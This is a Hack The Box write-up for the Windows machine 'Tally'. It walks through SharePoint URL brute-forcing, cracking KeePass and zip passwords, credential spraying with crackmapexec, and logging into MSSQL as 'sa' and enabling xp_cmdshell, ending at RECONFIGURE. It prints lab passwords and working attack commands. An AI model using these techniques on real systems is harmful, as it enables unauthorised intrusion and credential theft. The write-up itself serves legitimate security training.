---
tags:
  - keepass
  - sharepoint
  - seimpersonate
  - sweetpotato
  - mssql
group: Windows
---
![](https://labs.hackthebox.com/storage/avatars/72c8ccb9247de82b107cd045528e45a8.png)

- Machine : https://app.hackthebox.com/machines/Tally
- Reference : https://0xdf.gitlab.io/2022/04/11/htb-tally.html
- Solved : 2025.3.6. (Thu) (Takes 1days)

## Summary
---

1. **Initial Enumeration**
	- **Port Scanning**:
	    - Identified key services: **FTP (21), HTTP (80, 81, 15567, 32843, 47001), SMB (445), MSSQL (1433), WinRM (5985)**
	- **SharePoint Enumeration**:
	    - Used **SharePointURLBrute** to discover hidden endpoints.
	    - Found `/shared documents/forms/allitems.aspx`, revealing an FTP credentials file.
	- **Credential Discovery**:
	    - Extracted FTP credentials from **ftp-details.docx**.
	    - Explored SharePoint's `/viewlsts.aspx` to list available documents.

2. **Service Exploitation**
	- **FTP Access**:
	    - Logged in using **ftp_user** and downloaded all contents.
	    - Discovered a **KeePass database (`tim.kdbx`)** in user directories.
	- **KeePass Cracking**:
	    - Extracted a hash using `keepass2john` and cracked it with `hashcat`.
	    - Retrieved valid credentials for **SMB service**.
	- **SMB Enumeration**:
	    - Found the `ACCT` share accessible with **finance** credentials.
	    - Discovered `conn-info.txt` with an outdated **MSSQL credential**.
	- **MSSQL Exploitation**:
	    - Extracted **new MSSQL credentials** by analyzing **tester.exe** using `strings`.
	    - Used `impacket-mssqlclient` to access the database.
	    - Enabled **xp_cmdshell** to execute system commands.
	    - **Established a reverse shell as `Sarah`**.

3. **Privilege Escalation**
	- **Scheduled Task Hijacking**:
	    - Found **SPBestWarmUp.ps1** running as `Administrator`.
	    - Replaced the script to execute a **reverse shell**, gaining **Administrator access**.
	- **SeImpersonatePrivilege Abuse**:
	    - Verified `SeImpersonatePrivilege` was enabled.
	    - Attempted **GodPotato**, but it failed.
	    - Successfully exploited **SweetPotato** to execute a reverse shell as **SYSTEM**.

### Key Techniques:

- **Enumeration**: Nmap, SharePointURLBrute, SMBClient, CrackMapExec.
- **Credential Discovery**: KeePass cracking, password spraying, forensic analysis of binary files.
- **Exploitation**: MSSQL privilege abuse, scheduled task hijacking, SeImpersonatePrivilege exploitation.
- **Privilege Escalation**: **Abusing misconfigured scheduled tasks** and **leveraging SYSTEM token impersonation**.

---

# Reconnaissance

### Port Scanning

```bash
┌──(kali㉿kali)-[~/htb/tally]
└─$ /opt/custom-scripts/port-scan.sh 10.10.10.59
Performing quick port scan on 10.10.10.59...
Found open ports: 21,80,81,135,139,445,808,1433,5985,15567,32843,32844,32846,47001,49664,49665,49666,49667,49668,49669,49670
Performing detailed scan on 10.10.10.59...
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-06 00:13 MST
Nmap scan report for 10.10.10.59
Host is up (0.13s latency).

PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http               Microsoft IIS httpd 10.0
| http-title: Home
|_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx
|_http-server-header: Microsoft-IIS/10.0
81/tcp    open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp   open  ccproxy-http?
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2016 13.00.1601.00; RTM
| ms-sql-ntlm-info: 
|   10.10.10.59:1433: 
|     Target_Name: TALLY
|     NetBIOS_Domain_Name: TALLY
|     NetBIOS_Computer_Name: TALLY
|     DNS_Domain_Name: TALLY
|     DNS_Computer_Name: TALLY
|_    Product_Version: 10.0.14393
| ms-sql-info: 
|   10.10.10.59:1433: 
|     Version: 
|       name: Microsoft SQL Server 2016 RTM
|       number: 13.00.1601.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-03-06T07:10:09
|_Not valid after:  2055-03-06T07:10:09
|_ssl-date: 2025-03-06T07:14:37+00:00; -1s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
15567/tcp open  http               Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
|_http-title: Site doesn't have a title.
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
32843/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
32844/tcp open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-03-06T07:14:37+00:00; -1s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
| ssl-cert: Subject: commonName=SharePoint Services/organizationName=Microsoft/countryName=US
| Subject Alternative Name: DNS:localhost, DNS:tally
| Not valid before: 2017-09-17T22:51:16
|_Not valid after:  9999-01-01T00:00:00
32846/tcp open  storagecraft-image StorageCraft Image Manager
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc              Microsoft Windows RPC
49665/tcp open  msrpc              Microsoft Windows RPC
49666/tcp open  msrpc              Microsoft Windows RPC
49667/tcp open  msrpc              Microsoft Windows RPC
49668/tcp open  msrpc              Microsoft Windows RPC
49669/tcp open  msrpc              Microsoft Windows RPC
49670/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-03-06T07:14:10
|_  start_date: 2025-03-06T07:09:56
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 88.03 seconds
```

Several open ports are found.
The domain name is `tally`. Let's add this to `/etc/hosts`.

### ftp(21)

```bash
┌──(kali㉿kali)-[~/htb/tally]
└─$ ftp anonymous@10.10.10.59
Connected to 10.10.10.59.
220 Microsoft FTP Service
331 Password required
Password: 
530 User cannot log in.
ftp: Login failed
```

No meaning to visit without valid credential.

### http(80)

![](attachments/tally_1.png)

This is SharePoint UI.
But it doesn't have any documents without sign-in.

I googled to find resources, and found one useful one from here :
https://resources.bishopfox.com/resources/tools/sharepoint-hacking-diggity/attack-tools/

It introduces "SharePointURLBrute" tool as a public repository :
https://github.com/bhasbor/SharePointURLBrute-v1.1

Using this tool, I enumerated the sharepoint service.

```bash
┌──(kali㉿kali)-[~/htb/tally/SharePointURLBrute-v1.1]
└─$ perl 'SharePointURLBrute v1.1.pl' -a "http://tally" -e SharePoint-UrlExtensions-18Mar2012.txt 


Starting search for common SharePoint Pages
Start Time: Thu Mar  6 03:30:59 2025

FOUND: http://tally/_catalogs/masterpage/Forms/AllItems.aspx
FOUND: http://tally/_catalogs/wp/Forms/AllItems.aspx
FOUND: http://tally/_layouts/AreaNavigationSettings.aspx
FOUND: http://tally/_Layouts/AreaTemplateSettings.aspx
FOUND: http://tally/_Layouts/AreaWelcomePage.aspx
FOUND: http://tally/_Layouts/ChangeSiteMasterPage.aspx
FOUND: http://tally/_layouts/MyInfo.aspx
FOUND: http://tally/_layouts/MyPage.aspx
FOUND: http://tally/_layouts/PageSettings.aspx
FOUND: http://tally/_layouts/policy.aspx
FOUND: http://tally/_layouts/policyconfig.aspx
FOUND: http://tally/_layouts/policycts.aspx
FOUND: http://tally/_layouts/Policylist.aspx
FOUND: http://tally/_Layouts/RedirectPage.aspx?Target={SiteCollectionUrl}_catalogs/masterpage
FOUND: http://tally/_layouts/SiteDirectorySettings.aspx
FOUND: http://tally/_layouts/sitemanager.aspx
FOUND: http://tally/_Layouts/SiteManager.aspx?lro=all
FOUND: http://tally/_vti_bin/alerts.asmx
FOUND: http://tally/_vti_bin/dspsts.asmx
FOUND: http://tally/_vti_bin/forms.asmx
FOUND: http://tally/_vti_bin/Lists.asmx
FOUND: http://tally/_vti_bin/people.asmx
FOUND: http://tally/_vti_bin/Permissions.asmx
FOUND: http://tally/_vti_bin/search.asmx
FOUND: http://tally/_vti_bin/UserGroup.asmx
FOUND: http://tally/_vti_bin/versions.asmx
FOUND: http://tally/_vti_bin/Views.asmx
FOUND: http://tally/_vti_bin/webpartpages.asmx
FOUND: http://tally/_vti_bin/webs.asmx
FOUND: http://tally/_vti_bin/SharepointEmailWS.asmx
FOUND: http://tally/_vti_bin/spsearch.asmx
FOUND: http://tally/_vti_bin/WebPartPages.asmx
FOUND: http://tally/default.aspx
FOUND: http://tally/shared documents/forms/allitems.aspx


Search Complete
Total # of SP Admin URLs Found: 34
Finish Time: Thu Mar  6 03:31:54 2025
```

It found quite many pages.
I visited several of them, and focused on the last one : `/shared documents/forms/allitems.aspx`.
The name `allitems` implies that it might contains existing documents.

![](attachments/tally_2.png)

There is a document uploaded long ago named `ftp-details.docx`.
I uploaded this file to a viewer, and got the following;

```txt
FTP detailshostname: tally
workgroup: htb.local
password: UTDRSCH53c"$6hys
Please create your own user folder upon logging in
```

It reveals ftp credential : `UTDRSCH53c"$6hys`
It only has password not username yet.

> According to IPPSEC / 0xdf, `/_layouts/15/viewlsts.aspx` shows all existing contents of SharePoint. It doesn't show up with SharePintURLBrute, but there is on `/usr/share/seclists/Discovery/Web-Content/sharepoint-ennumeration.txt`

![](attachments/tally_3.png)

Besides the "Documents" (The one we visited), "Site Pages" also has one item.

![](attachments/tally_4.png)

![](attachments/tally_5.png)

```
Migration update


Hi all,

Welcome to your new team page!

As always, there's still a few finishing touches to make.  Rahul - please upload the design mock ups to the Intranet folder as 'index.html' using the ftp_user account - I aim to review regularly.

We'll also add the fund and client account pages in due course.

Thanks – Sarah & Tim.
```

### ftp(21) - again

There are many directories on the ftp share.

```bash
┌──(kali㉿kali)-[~/htb/tally]
└─$ ftp ftp_user@tally       
Connected to tally.
220 Microsoft FTP Service
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||50070|)
150 Opening ASCII mode data connection.
08-31-17  10:51PM       <DIR>          From-Custodian
10-01-17  10:37PM       <DIR>          Intranet
08-28-17  05:56PM       <DIR>          Logs
09-15-17  08:30PM       <DIR>          To-Upload
09-17-17  08:27PM       <DIR>          User
226 Transfer complete.
```

I can mirror all of them with `wget` command with `--mirror` option.

```bash
┌──(kali㉿kali)-[~/htb/tally/ftp]
└─$ wget --mirror 'ftp://ftp_user:UTDRSCH53c"$6hys@tally'
--2025-03-06 04:34:54--  ftp://ftp_user:*password*@tally/
           => ‘tally/.listing’
Resolving tally (tally)... 10.10.10.59
Connecting to tally (tally)|10.10.10.59|:21... connected.
Logging in as ftp_user ... Logged in!
==> SYST ... done.    ==> PWD ... done.
==> TYPE I ... done.  ==> CWD not needed.
==> PASV ... done.    ==> LIST ... done.

<SNIP>
```

```bash
┌──(kali㉿kali)-[~/htb/tally/ftp]
└─$ tree                       
.
└── tally
    ├── From-Custodian
    │   ├── RED-528103410.log
    │   ├── RED-528113411.log
    │   ├── RED-528123412.log
...SNIP...
    │   ├── RED-5287347.log
    │   ├── RED-5288348.log
    │   └── RED-5289349.log
    ├── Intranet
    │   └── Binaries
    │       └── Firefox Setup 44.0.2.exe
    ├── Logs
    │   ├── ftp_connect_8235771490510.txt
    │   ├── ftp_connect_8235771490511.txt
    │   ├── ftp_connect_8235771490512.txt
...SNIP...
    │   ├── ftp_connect_823577149057.txt
    │   ├── ftp_connect_823577149058.txt
    │   └── ftp_connect_823577149059.txt
    ├── To-Upload
    │   ├── employees-id_number.xlsx
    │   └── Invoices.zip
    └── User
        ├── Administrator
        │   └── New folder
        ├── Ekta
        │   ├── OFSI_quick_guide_flyer.pdf
        │   └── PSAIS_1_April_2017.pdf
        ├── Jess
        │   └── actu8-espreadsheet-designer-datasheet.pdf
        ├── Paul
        │   ├── financial-list-guide.pdf
        │   ├── financial_sanctions_guidance_august_2017.pdf
        │   ├── Monetary_penalties_for_breaches_of_financial_sanctions.pdf
        │   └── New folder
        ├── Rahul
        │   └── Mockups-Backup
        ├── Sarah
        │   ├── MBSASetup-x64-EN.msi
        │   ├── notes.txt
        │   └── Windows-KB890830-x64-V5.52.exe
        ├── Stuart
        │   ├── customers - Copy.csv
        │   └── Unit4-Connect-Financials-Agenda.pdf
        ├── Tim
        │   ├── Files
        │   │   ├── bonus.txt
        │   │   ├── KeePass-2.36
        │   │   │   ├── KeePass.chm
        │   │   │   ├── KeePass.exe
        │   │   │   ├── KeePass.exe.config
        │   │   │   ├── KeePassLibC32.dll
        │   │   │   ├── KeePassLibC64.dll
        │   │   │   ├── KeePass.XmlSerializers.dll
        │   │   │   ├── License.txt
        │   │   │   ├── Plugins
        │   │   │   ├── ShInstUtil.exe
        │   │   │   └── XSL
        │   │   │       ├── KDBX_Common.xsl
        │   │   │       ├── KDBX_DetailsFull_HTML.xsl
        │   │   │       ├── KDBX_DetailsLight_HTML.xsl
        │   │   │       ├── KDBX_PasswordsOnly_TXT.xsl
        │   │   │       └── KDBX_Tabular_HTML.xsl
        │   │   └── tim.kdbx
        │   └── Project
        │       ├── Communications
        │       ├── Log
        │       │   └── do to.txt
        │       └── Vendors
        └── Yenwi
            └── Archive

29 directories, 130 files
```

Here are some interesting files..

It's mentioning SQL Server 2016 which might be still on the system.

```bash
┌──(kali㉿kali)-[~/…/ftp/tally/User/Sarah]
└─$ cat notes.txt 

done

install Sharepoint, replace Orchard CMS

to do

uninstall SQL Server 2016
```

There's a `kdbx` file on the system. Let's crack it.

```ruby
┌──(kali㉿kali)-[~/…/tally/User/Tim/Files]
└─$ ls
bonus.txt  KeePass-2.36  tim.kdbx
```

First, extract the hash.

```bash
┌──(kali㉿kali)-[~/htb/tally]
└─$ keepass2john tim.kdbx                
tim:$keepass$*2*6000*0*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da
```

Then crack the hash using `hashcat`.

```bash
┌──(kali㉿kali)-[~/htb/tally]
└─$ hashcat -m 13400 -a 0 tim.kdbx.hash /usr/share/wordlists/rockyou.txt --user
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

<SNIP>

$keepass$*2*6000*0*f362b5565b916422607711b54e8d0bd20838f5111d33a5eed137f9d66a375efb*3f51c5ac43ad11e0096d59bb82a59dd09cfd8d2791cadbdb85ed3020d14c8fea*3f759d7011f43b30679a5ac650991caa*b45da6b5b0115c5a7fb688f8179a19a749338510dfe90aa5c2cb7ed37f992192*535a85ef5c9da14611ab1c1edc4f00a045840152975a4d277b3b5c4edc1cd7da:simplementeyo

Session..........: hashcat
Status...........: Cracked

<SNIP>
```

The cracked password for the `kdbx` file is `simplementeyo`.

`kpcli` is required to use the `kdbx` file. So need to install that first.

```bash
┌──(kali㉿kali)-[~/htb/tally]
└─$ kpcli --kdb tim.kdbx                 
Provide the master password: *************************

KeePass CLI (kpcli) v3.8.1 is ready for operation.
Type 'help' for a description of available commands.
Type 'help <command>' for details on individual commands.

kpcli:/> 
```

`find .` shows all entries.

```bash
kpcli:/> find .
Searching for "." ...
 - 3 matches found and placed into /_found/
Would you like to list them now? [y/N] 
=== Entries ===
0. Default                                                                
1. PDF Writer                                                             
2. TALLY ACCT share 
```

`show -f {number}` shows the passwords of {number}-th entry.

```bash
kpcli:/> show -f 0

 Path: /WORK/CISCO/
Title: Default
Uname: cisco
 Pass: cisco123
  URL: 
Notes: 

kpcli:/> show -f 1

 Path: /WORK/SOFTWARE/
Title: PDF Writer
Uname: 64257-56525-54257-54734
 Pass: 
  URL: 
Notes: 

kpcli:/> show -f 2

 Path: /WORK/WINDOWS/Shares/
Title: TALLY ACCT share
Uname: Finance
 Pass: Acc0unting
  URL: 
Notes: 
```

Two credentials are found.
- `cisco` : `cisco123`
- `Finance` : `Acc0unting`

I tested all the combinations using `crackmapexec`.

```perl
┌──(kali㉿kali)-[~/htb/tally]
└─$ crackmapexec smb 10.10.10.59 -u user.txt -p pass.txt --continue-on-success
SMB         10.10.10.59     445    TALLY            [*] Windows Server 2016 Standard 14393 x64 (name:TALLY) (domain:TALLY) (signing:False) (SMBv1:True)
SMB         10.10.10.59     445    TALLY            [+] TALLY\ftp_user:UTDRSCH53c"$6hys 

...SNIP...

SMB         10.10.10.59     445    TALLY            [+] TALLY\finance:Acc0unting 
```

There are two valid credentials for SMB service :
- `ftp_user` : `UTDRSCH53c"$6hys`
- `finance` : `Acc0unting`

```bash
┌──(kali㉿kali)-[~/htb/tally]
└─$ crackmapexec smb 10.10.10.59 -u ftp_user -p 'UTDRSCH53c"$6hys' --shares
SMB         10.10.10.59     445    TALLY            [*] Windows Server 2016 Standard 14393 x64 (name:TALLY) (domain:TALLY) (signing:False) (SMBv1:True)
SMB         10.10.10.59     445    TALLY            [+] TALLY\ftp_user:UTDRSCH53c"$6hys 
SMB         10.10.10.59     445    TALLY            [+] Enumerated shares
SMB         10.10.10.59     445    TALLY            Share           Permissions     Remark                                                                
SMB         10.10.10.59     445    TALLY            -----           -----------     ------                                                                
SMB         10.10.10.59     445    TALLY            ACCT                                                                                                  
SMB         10.10.10.59     445    TALLY            ADMIN$                          Remote Admin                                                          
SMB         10.10.10.59     445    TALLY            C$                              Default share                                                         
SMB         10.10.10.59     445    TALLY            IPC$                            Remote IPC                                                            
                                                                             
┌──(kali㉿kali)-[~/htb/tally]
└─$ crackmapexec smb 10.10.10.59 -u finance -p 'Acc0unting' --shares
SMB         10.10.10.59     445    TALLY            [*] Windows Server 2016 Standard 14393 x64 (name:TALLY) (domain:TALLY) (signing:False) (SMBv1:True)
SMB         10.10.10.59     445    TALLY            [+] TALLY\finance:Acc0unting 
SMB         10.10.10.59     445    TALLY            [+] Enumerated shares
SMB         10.10.10.59     445    TALLY            Share           Permissions     Remark                                                                
SMB         10.10.10.59     445    TALLY            -----           -----------     ------                                                                
SMB         10.10.10.59     445    TALLY            ACCT            READ                                                                                  
SMB         10.10.10.59     445    TALLY            ADMIN$                          Remote Admin                                                          
SMB         10.10.10.59     445    TALLY            C$                              Default share                                                         
SMB         10.10.10.59     445    TALLY            IPC$                            Remote IPC  
```

Only the user `finance` has "READ" permission on `ACCT` share.

```yaml
┌──(kali㉿kali)-[~/htb/tally/smb]
└─$ smbclient \\\\10.10.10.59\\ACCT -U finance
Password for [WORKGROUP\finance]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Sep 17 23:58:18 2017
  ..                                  D        0  Sun Sep 17 23:58:18 2017
  Customers                           D        0  Sun Sep 17 14:28:40 2017
  Fees                                D        0  Mon Aug 28 15:20:52 2017
  Invoices                            D        0  Mon Aug 28 15:18:19 2017
  Jess                                D        0  Sun Sep 17 14:41:29 2017
  Payroll                             D        0  Mon Aug 28 15:13:32 2017
  Reports                             D        0  Fri Sep  1 14:50:11 2017
  Tax                                 D        0  Sun Sep 17 14:45:47 2017
  Transactions                        D        0  Wed Sep 13 13:57:44 2017
  zz_Archived                         D        0  Fri Sep 15 14:29:35 2017
  zz_Migration                        D        0  Sun Sep 17 14:49:13 2017

                8387839 blocks of size 4096. 717429 blocks available
smb: \> recurse on
smb: \> prompt off
smb: \> mget *
getting file \Customers\customers.csv of size 16213 as Customers/customers.csv (31.2 KiloBytes/sec) (average 31.2 KiloBytes/sec)
getting file \Fees\cust_fees_id_4265835_221671.csv of size 45 as Fees/cust_fees_id_4265835_221671.csv (0.1 KiloBytes/sec) (average 15.7 KiloBytes/sec)
getting file \Fees\cust_fees_id_4265835_2216710.csv of size 46 as Fees/cust_fees_id_4265835_2216710.csv (0.1 KiloBytes/sec) (average 10.6 KiloBytes/sec)

...SNIP...
```

Alternative of it is using `mount`.

```bash
sudo mount -t cifs -o user=Finance,pass=Acc0unting //10.10.10.59/ACCT /mnt/tally_smb
```


Among the shared files, I found a file storing another credential.

```bash
┌──(kali㉿kali)-[~/…/tally/smb/zz_Archived/SQL]
└─$ cat conn-info.txt 
old server details

db: sa
pass: YE%TJC%&HYbe5Nw

have changed for tally 
```

Given the username `sa`, it seems to be a credential for mssql service.
I tested with this credential, but it failed.

```bash
┌──(kali㉿kali)-[~/…/tally/smb/zz_Archived/SQL]
└─$ impacket-mssqlclient 'sa:YE%TJC%&HYbe5Nw@10.10.10.59'        
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[-] ERROR(TALLY): Line 1: Login failed for user 'sa'.
```

Given the comment "old server details" in `conn-info.txt`, this might be outdated info.

I enumerated further the smb share, and found one outstanding binary in `/zz_Migration/Binaries/New folder`.
Among the files in the same directory, `tester.exe` only look like a non-commercial binary.

```bash
┌──(kali㉿kali)-[/mnt/tally_smb/zz_Migration/Binaries/New folder]
└─$ ls                       
crystal_reports_viewer_2016_sp04_51051980.zip
Macabacus2016.exe
Orchard.Web.1.7.3.zip
putty.exe
RpprtSetup.exe
tableau-desktop-32bit-10-3-2.exe
tester.exe
vcredist_x64.exe



┌──(kali㉿kali)-[/mnt/tally_smb/zz_Migration/Binaries/New folder]
└─$ strings tester.exe | more

<SNIP>

SQLSTATE: 
Message: 
DRIVER={SQL Server};SERVER=TALLY, 1433;DATABASE=orcharddb;UID=sa;PWD=GW
E3V65#6KFH93@4GWTG2G;
select * from Orchard_Users_UserPartRecord
Unknown exception

<SNIP>
```

Here it reveals the password of user `sa` for `orcharddb` : `GWE3V65#6KFH93@4GWTG2G`
Since the password is different from what we found previously, the server might have been updated.

One more interesting file was `orcharddb.zip` in `/zz_Migration/Backup/20170808/orcharddb`.

```bash
┌──(kali㉿kali)-[/mnt/…/zz_Migration/Backup/20170808/orcharddb]
└─$ ls
orcharddb.zip


┌──(kali㉿kali)-[/mnt/…/zz_Migration/Backup/20170808/orcharddb]
└─$ cp orcharddb.zip ~/htb/tally/


┌──(kali㉿kali)-[~/htb/tally/orcharddb]
└─$ unzip orcharddb.zip         
Archive:  orcharddb.zip
[orcharddb.zip] orcharddb.sql password:  
```

Since it's asking password to unzip, let's use `fcrackzip` to crack the password.

```bash
┌──(kali㉿kali)-[~/htb/tally/orcharddb]
└─$ fcrackzip -uDp /usr/share/wordlists/rockyou.txt orcharddb.zip 


PASSWORD FOUND!!!!: pw == Acc0unting
```

The password was the same as what we found from keepass.

```bash
┌──(kali㉿kali)-[~/htb/tally/orcharddb]
└─$ unzip orcharddb.zip 
Archive:  orcharddb.zip
[orcharddb.zip] orcharddb.sql password: 
  inflating: orcharddb.sql  


┌──(kali㉿kali)-[~/htb/tally/orcharddb]
└─$ cat orcharddb.sql
��/*    ==Scripting Parameters==

    Source Server Version : SQL Server 2016 (13.0.1601)
    Source Database Engine Edition : Microsoft SQL Server Enterprise Edition
    Source Database Engine Type : Standalone SQL Server

    Target Server Version : SQL Server 2017
    Target Database Engine Edition : Microsoft SQL Server Standard Edition
    Target Database Engine Type : Standalone SQL Server
*/
USE [orcharddb]
GO
/****** Object:  Table [dbo].[default_Orchard_Users_UserPartRecord]    Script Date: 03/09/2017 14:57:24 ******/
SET ANSI_NULLS ON
GO
SET QUOTED_IDENTIFIER ON
GO
CREATE TABLE [dbo].[default_Orchard_Users_UserPartRecord](
        [Id] [int] NOT NULL,
        [UserName] [nvarchar](255) NULL,
        [Email] [nvarchar](255) NULL,
        [NormalizedUserName] [nvarchar](255) NULL,
        [Password] [nvarchar](255) NULL,
        [PasswordFormat] [nvarchar](255) NULL,
        [HashAlgorithm] [nvarchar](255) NULL,
        [PasswordSalt] [nvarchar](255) NULL,
        [RegistrationStatus] [nvarchar](255) NULL,
        [EmailStatus] [nvarchar](255) NULL,
        [EmailChallengeToken] [nvarchar](255) NULL,
PRIMARY KEY CLUSTERED 
(
        [Id] ASC
)WITH (PAD_INDEX = OFF, STATISTICS_NORECOMPUTE = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS = ON, ALLOW_PAGE_LOCKS = ON) ON [PRIMARY]
) ON [PRIMARY]
GO
INSERT [dbo].[default_Orchard_Users_UserPartRecord] ([Id], [UserName], [Email], [NormalizedUserName], [Password], [PasswordFormat], [HashAlgorithm], [PasswordSalt], [RegistrationStatus], [EmailStatus], [EmailChallengeToken]) VALUES (2, N'admin', N'', N'admin', N'Finance2', N'Clear', N'SHA1', N's2Ieb5Pn7Vwf+X6JEXJitg==', N'Approved', N'Approved', NULL)
ALTER TABLE [dbo].[default_Orchard_Users_UserPartRecord] ADD  DEFAULT ('Approved') FOR [RegistrationStatus]
GO
ALTER TABLE [dbo].[default_Orchard_Users_UserPartRecord] ADD  DEFAULT ('Approved') FOR [EmailStatus]
GO
```

Here I found one more credential for `admin` in Orchard : `admin` : `Finance2`.
Don't know exactly where to use this password though.

### mssql(1433)

Let's open a mssql connection first.

```bash
┌──(kali㉿kali)-[~/htb/tally/orcharddb]
└─$ impacket-mssqlclient 'sa:GWE3V65#6KFH93@4GWTG2G@10.10.10.59'  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(TALLY): Line 1: Changed database context to 'master'.
[*] INFO(TALLY): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 665) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 
```

Let's grep some basic information of the database.

```sql
SQL (sa  dbo@master)> SELECT @@version;
---------------------------------------------------------------------------------
Microsoft SQL Server 2016 (RTM) - 13.0.1601.5 (X64) 
        Apr 29 2016 23:23:58 
        Copyright (c) Microsoft Corporation
        Enterprise Edition (64-bit) on Windows Server 2016 Standard 6.3 <X64> (Build 14393: ) (Hypervisor)


SQL (sa  dbo@master)> SELECT USER_NAME();
---   
dbo 


SQL (sa  dbo@master)> SELECT SYSTEM_USER;  
--   
sa 


SQL (sa  dbo@master)> SELECT name FROM master.dbo.sysdatabases;
name     
------   
master   
tempdb   
model    
msdb  
```

Let's deep dive into the database.

```sql
SQL (sa  dbo@master)> use master;
ENVCHANGE(DATABASE): Old Value: master, New Value: master
INFO(TALLY): Line 1: Changed database context to 'master'.


SQL (sa  dbo@master)> SELECT * FROM INFORMATION_SCHEMA.TABLES;
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME              TABLE_TYPE   
-------------   ------------   ---------------------   ----------   
master          dbo            spt_fallback_db         b'BASE TABLE'   

master          dbo            spt_fallback_dev        b'BASE TABLE'   

master          dbo            spt_fallback_usg        b'BASE TABLE'   

master          dbo            spt_values              b'VIEW'      

master          dbo            spt_monitor             b'BASE TABLE'   

master          dbo            MSreplication_options   b'BASE TABLE'   
```



# Shell as `sarah`

According the 0xdf's post, there are multiple ways of exploit.

![](attachments/tally_6.png)

### Execution via MSSQL

```sql
SQL (sa  dbo@msdb)> help

    lcd {path}                 - changes the current local directory to {path}
    exit                       - terminates the server process (and this session)
    enable_xp_cmdshell         - you know what it means
    disable_xp_cmdshell        - you know what it means
    enum_db                    - enum databases
    enum_links                 - enum linked servers
    enum_impersonate           - check logins that can be impersonated
    enum_logins                - enum login users
    enum_users                 - enum current db users
    enum_owner                 - enum db owner
    exec_as_user {user}        - impersonate with execute as user
    exec_as_login {login}      - impersonate with execute as login
    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
    xp_dirtree {path}          - executes xp_dirtree on the path
    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
    ! {cmd}                    - executes a local shell cmd
    show_query                 - show query
    mask_query                 - mask query


SQL (sa  dbo@msdb)> xp_cmdshell whoami
ERROR(TALLY): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

`xp_cmdshell` command is disabled for now.
But it can be enabled since I signed in  as `sa` user.

```sql
SQL (sa  dbo@master)> enable_xp_cmdshell
INFO(TALLY): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
INFO(TALLY): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.


SQL (sa  dbo@master)> RECONFIGURE


